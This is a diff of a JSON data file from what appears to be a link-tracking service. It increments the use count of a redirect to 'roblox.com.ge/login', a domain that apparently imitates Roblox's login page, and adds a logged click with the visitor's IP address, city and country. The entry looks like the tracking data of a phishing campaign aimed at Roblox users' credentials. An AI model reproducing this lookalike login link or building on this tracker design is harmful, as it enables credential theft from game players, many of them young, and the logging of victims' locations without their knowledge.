@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 851,
+    "useCount": 852,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6920,6 +6920,14 @@
         "city": "Pawtucket",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777182271735,
+        "ip": "116.109.124.99",
+        "country": "Vietnam",
+        "city": "Hanoi",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
